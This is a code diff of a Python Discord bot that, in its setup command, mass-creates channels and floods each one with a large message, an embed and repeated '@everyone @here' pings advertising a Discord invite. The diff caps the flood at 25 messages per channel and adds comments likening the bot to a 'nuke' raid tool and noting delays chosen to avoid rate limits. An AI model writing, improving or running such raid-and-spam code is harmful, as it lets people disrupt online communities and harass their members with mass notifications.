@@ -332,21 +332,25 @@ async def setup(ctx):
     font_styles = ["bold", "script", "double"]
     created_channels = []
 
-    await user.send(f"🔄 Starting creation of {total_channels} channels in parallel (Larp Nuke Bot style)...")
+    await user.send(f"🔄 Starting creation of {total_channels} channels in parallel...")
 
     ping_counts = [5, 6, 7, 8, 9, 10, 11, 12, 14, 15]
 
     async def spam_channel(channel):
+        """Send exactly 25 messages per channel (like Insomnia premium) + embed and big message."""
         try:
+            # Send the big message once
             await channel.send(content=big_message)
             await asyncio.sleep(0.08)
+            # Send the embed once
             await channel.send(embed=embed_content)
             await asyncio.sleep(0.08)
-            while True:
+            # Send 25 spam messages with ping (like Insomnia premium)
+            for _ in range(25):
                 ping_count = random.randint(5, 12)
                 msg = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
                 await channel.send(content=msg)
-                await asyncio.sleep(0.06)
+                await asyncio.sleep(0.06)  # small delay to avoid rate-limit
         except Exception:
             pass
 
@@ -375,7 +379,7 @@ async def setup(ctx):
     tasks = [create_and_spam(i) for i in range(total_channels)]
     await asyncio.gather(*tasks)
 
-    await user.send(f"✅ All {len(created_channels)} channels created, spam is running on all channels in parallel!")
+    await user.send(f"✅ All {len(created_channels)} channels created, spam (25 messages per channel) is running in parallel!")
 
     # Wait 3 seconds for spam to start
     await asyncio.sleep(3)
